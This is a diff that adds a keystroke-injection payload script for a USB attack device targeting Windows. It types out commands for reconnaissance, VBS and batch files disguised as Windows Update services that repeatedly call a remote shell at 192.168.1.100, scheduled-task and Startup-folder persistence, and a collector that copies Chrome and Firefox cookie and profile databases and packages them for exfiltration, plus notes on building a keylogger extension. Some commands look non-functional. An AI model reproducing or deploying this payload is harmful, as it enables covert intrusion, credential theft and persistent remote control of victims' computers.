@@ -1,0 +1,304 @@
+// Phase 1: Initial Access with Limited Privileges
+// ==============================================
+GuiR
+Delay 500
+Print cmd.exe
+Press KEY_ENTER
+Delay 1000
+
+// Create hidden directories in user-accessible locations
+PrintLine mkdir "%APPDATA%\Microsoft\Windows\Templates\Cache" 2>nul
+Delay 500
+PrintLine mkdir "%LOCALAPPDATA%\Microsoft\Windows\WebCache\History" 2>nul
+Delay 500
+
+// Basic system reconnaissance within user context
+PrintLine whoami > "%APPDATA%\Microsoft\Windows\Templates\Cache\id.dat"
+Delay 500
+PrintLine net user %USERNAME% > "%APPDATA%\Microsoft\Windows\Templates\Cache\profile.dat"
+Delay 500
+PrintLine ipconfig /all > "%APPDATA%\Microsoft\Windows\Templates\Cache\net.dat"
+Delay 500
+PrintLine systeminfo > "%APPDATA%\Microsoft\Windows\Templates\Cache\sys.dat"
+Delay 1000
+PrintLine exit
+Delay 500
+
+// Phase 2: Create User-Level Persistence Mechanisms
+// ===============================================
+GuiR
+Delay 500
+Print notepad "%APPDATA%\Microsoft\Windows\Templates\Cache\update.vbs"
+Press KEY_ENTER
+Delay 1000
+
+// VBS script for establishing remote shell callback
+PrintLine On Error Resume Next
+PrintLine ' Windows Update Service Assistant
+PrintLine ' Performs regular connection to update servers
+PrintLine 
+PrintLine Dim WshShell, fso, attempts
+PrintLine Set WshShell = CreateObject("WScript.Shell")
+PrintLine Set fso = CreateObject("Scripting.FileSystemObject")
+PrintLine 
+PrintLine ' Connectivity check function
+PrintLine Sub CheckConnection()
+PrintLine   attempts = 0
+PrintLine   Do While attempts < 5
+PrintLine     ' Use ShellWin command to establish connection back to remote server
+PrintLine     WshShell.Run "cmd.exe /c echo ShellWin 192.168.1.100 > %TEMP%\svc.txt & certutil -encode %TEMP%\svc.txt %TEMP%\svc.b64 & type %TEMP%\svc.b64 & del %TEMP%\svc.txt %TEMP%\svc.b64", 0, True
+PrintLine     WScript.Sleep 60000 ' 1 minute delay between attempts
+PrintLine     attempts = attempts + 1
+PrintLine   Loop
+PrintLine   
+PrintLine   ' Schedule next check
+PrintLine   WScript.Sleep 3600000 ' 1 hour delay
+PrintLine   CheckConnection
+PrintLine End Sub
+PrintLine 
+PrintLine ' Start connectivity check loop
+PrintLine CheckConnection
+Delay 1000
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Create the second persistence script for scheduled task
+GuiR
+Delay 500
+Print notepad "%APPDATA%\Microsoft\Windows\Templates\Cache\schtask.bat"
+Press KEY_ENTER
+Delay 1000
+
+// Batch file to create a user-level scheduled task
+PrintLine @echo off
+PrintLine :: Windows Update Task Scheduler
+PrintLine :: Creates a scheduled task to run the update service
+PrintLine 
+PrintLine :: Create scheduled task to run update script
+PrintLine schtasks /create /tn "Windows Update Assistant" /tr "wscript.exe \"%APPDATA%\Microsoft\Windows\Templates\Cache\update.vbs\"" /sc hourly /F
+PrintLine 
+PrintLine :: Remove this batch file after execution
+PrintLine (goto) 2>nul & del "%~f0"
+Delay 1000
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Execute the scheduled task creation
+GuiR
+Delay 500
+Print cmd.exe /c "%APPDATA%\Microsoft\Windows\Templates\Cache\schtask.bat"
+Press KEY_ENTER
+Delay 2000
+
+// Phase 3: Create Data Collection Mechanism
+// =======================================
+GuiR
+Delay 500
+Print notepad "%APPDATA%\Microsoft\Windows\Templates\Cache\collect.vbs"
+Press KEY_ENTER
+Delay 1000
+
+// VBS script for collecting sensitive user data
+PrintLine On Error Resume Next
+PrintLine ' Windows Data Collection Service
+PrintLine ' Collects system information for diagnostics
+PrintLine 
+PrintLine Dim WshShell, fso, objFolder, objFile, strDirectory
+PrintLine Set WshShell = CreateObject("WScript.Shell")
+PrintLine Set fso = CreateObject("Scripting.FileSystemObject")
+PrintLine 
+PrintLine ' Create collection directory
+PrintLine strDirectory = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\Windows\WebCache\History\Cache")
+PrintLine If Not fso.FolderExists(strDirectory) Then
+PrintLine   fso.CreateFolder(strDirectory)
+PrintLine End If
+PrintLine 
+PrintLine ' Collect browser data
+PrintLine Sub CollectBrowserData()
+PrintLine   Dim browserPaths, i, targetPath, targetFolder
+PrintLine   
+PrintLine   ' Define browser data locations
+PrintLine   browserPaths = Array( _
+PrintLine     WshShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Cookies"), _
+PrintLine     WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Google\Chrome\User Data\Default"), _
+PrintLine     WshShell.ExpandEnvironmentStrings("%APPDATA%\Mozilla\Firefox\Profiles") _
+PrintLine   )
+PrintLine   
+PrintLine   targetFolder = strDirectory & "\browser_" & Replace(FormatDateTime(Now, 2), "/", "-")
+PrintLine   If Not fso.FolderExists(targetFolder) Then
+PrintLine     fso.CreateFolder(targetFolder)
+PrintLine   End If
+PrintLine   
+PrintLine   ' Copy browser files
+PrintLine   For i = 0 To UBound(browserPaths)
+PrintLine     targetPath = browserPaths(i)
+PrintLine     If fso.FolderExists(targetPath) Then
+PrintLine       WshShell.Run "cmd.exe /c xcopy """ & targetPath & "\*.txt"" """ & targetFolder & "\" & i & "\" & """ /E /H /C /I /Q /Y", 0, True
+PrintLine       WshShell.Run "cmd.exe /c xcopy """ & targetPath & "\*.sqlite"" """ & targetFolder & "\" & i & "\" & """ /E /H /C /I /Q /Y", 0, True
+PrintLine       WshShell.Run "cmd.exe /c xcopy """ & targetPath & "\*.db"" """ & targetFolder & "\" & i & "\" & """ /E /H /C /I /Q /Y", 0, True
+PrintLine     End If
+PrintLine   Next
+PrintLine End Sub
+PrintLine 
+PrintLine ' Collect document file information
+PrintLine Sub CollectDocumentInfo()
+PrintLine   Dim docPath, targetFile
+PrintLine   docPath = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Documents")
+PrintLine   targetFile = strDirectory & "\docs_" & Replace(FormatDateTime(Now, 2), "/", "-") & ".txt"
+PrintLine   
+PrintLine   ' List all document files
+PrintLine   WshShell.Run "cmd.exe /c dir """ & docPath & """ /s /b /a-d > """ & targetFile & """", 0, True
+PrintLine End Sub
+PrintLine 
+PrintLine ' Collect network information
+PrintLine Sub CollectNetworkInfo()
+PrintLine   Dim targetFile
+PrintLine   targetFile = strDirectory & "\net_" & Replace(FormatDateTime(Now, 2), "/", "-") & ".txt"
+PrintLine   
+PrintLine   ' Get network configuration information
+PrintLine   WshShell.Run "cmd.exe /c ipconfig /all > """ & targetFile & """", 0, True
+PrintLine   WshShell.Run "cmd.exe /c netstat -ano >> """ & targetFile & """", 0, True
+PrintLine   WshShell.Run "cmd.exe /c net user %USERNAME% >> """ & targetFile & """", 0, True
+PrintLine End Sub
+PrintLine 
+PrintLine ' Package and prepare data for exfiltration
+PrintLine Sub PrepareExfiltration()
+PrintLine   Dim zipFile, targetFolder
+PrintLine   zipFile = WshShell.ExpandEnvironmentStrings("%TEMP%\update_" & Replace(FormatDateTime(Now, 2), "/", "-") & ".zip")
+PrintLine   targetFolder = strDirectory
+PrintLine   
+PrintLine   ' Compress data using built-in Windows compression
+PrintLine   Set objFolder = fso.GetFolder(targetFolder)
+PrintLine   Set objFile = fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%TEMP%\makecab.ddf"), True)
+PrintLine   objFile.WriteLine(".OPTION EXPLICIT")
+PrintLine   objFile.WriteLine(".Set CabinetNameTemplate=" & zipFile)
+PrintLine   objFile.WriteLine(".Set DiskDirectoryTemplate=CDROM")
+PrintLine   objFile.WriteLine(".Set CompressionType=MSZIP")
+PrintLine   objFile.WriteLine(".Set Cabinet=on")
+PrintLine   objFile.WriteLine(".Set Compress=on")
+PrintLine   
+PrintLine   ' Add files to the cabinet file
+PrintLine   For Each file In objFolder.Files
+PrintLine     objFile.WriteLine("""" & file.Path & """")
+PrintLine   Next
+PrintLine   objFile.Close
+PrintLine   
+PrintLine   ' Create cabinet file
+PrintLine   WshShell.Run "cmd.exe /c makecab /f " & WshShell.ExpandEnvironmentStrings("%TEMP%\makecab.ddf"), 0, True
+PrintLine   
+PrintLine   ' Clean up
+PrintLine   fso.DeleteFile WshShell.ExpandEnvironmentStrings("%TEMP%\makecab.ddf")
+PrintLine End Sub
+PrintLine 
+PrintLine ' Execute collection sequence
+PrintLine CollectBrowserData
+PrintLine CollectDocumentInfo
+PrintLine CollectNetworkInfo
+PrintLine PrepareExfiltration
+PrintLine 
+PrintLine ' Schedule next collection
+PrintLine WshShell.Run "schtasks /create /tn ""Windows Data Collection"" /tr ""wscript.exe " & Chr(34) & WshShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Templates\Cache\collect.vbs") & Chr(34) & """ /sc daily /st 13:00 /F", 0, True
+Delay 1000
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Execute data collection immediately
+GuiR
+Delay 500
+Print wscript.exe "%APPDATA%\Microsoft\Windows\Templates\Cache\collect.vbs"
+Press KEY_ENTER
+Delay 2000
+
+// Phase 4: Create Browser Extension for Keylogging
+// ==============================================
+GuiR
+Delay 500
+Print notepad "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\keylog.txt"
+Press KEY_ENTER
+Delay 1000
+
+// Create a note to self about setting up a malicious browser extension
+PrintLine Manual Step Required:
+PrintLine 
+PrintLine To complete browser keylogging capability:
+PrintLine 1. Create malicious Chrome extension
+PrintLine 2. Load extension from %LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\keylogger\
+PrintLine 3. Manifest should request minimal permissions to avoid suspicion
+PrintLine 4. Extension should capture form data and keystrokes
+PrintLine 5. Save data to %LOCALAPPDATA%\Microsoft\Windows\WebCache\History\Cache\keylog_data.txt
+PrintLine 
+PrintLine Note: This needs to be done manually as it requires browser interaction that's difficult to script.
+Delay 1000
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Phase 5: Create Remote Shell Handler for Manual Execution
+// ======================================================
+GuiR
+Delay 500
+Print notepad "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.bat"
+Press KEY_ENTER
+Delay 1000
+
+// Create a startup batch file for immediate connection at login
+PrintLine @echo off
+PrintLine :: Windows Update Service
+PrintLine :: Connects to update servers at system startup
+PrintLine 
+PrintLine :: Establish connection to update server
+PrintLine ShellWin 192.168.1.100
+PrintLine 
+PrintLine :: If connection fails, retry with delay
+PrintLine timeout /t 300 /nobreak > nul
+PrintLine ShellWin 192.168.1.100
+Delay 1000
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Phase 6: Start Initial Remote Shell Session
+// =========================================
+GuiR
+Delay 500
+Print cmd.exe /c ShellWin 192.168.1.100
+Press KEY_ENTER
+Delay 5000
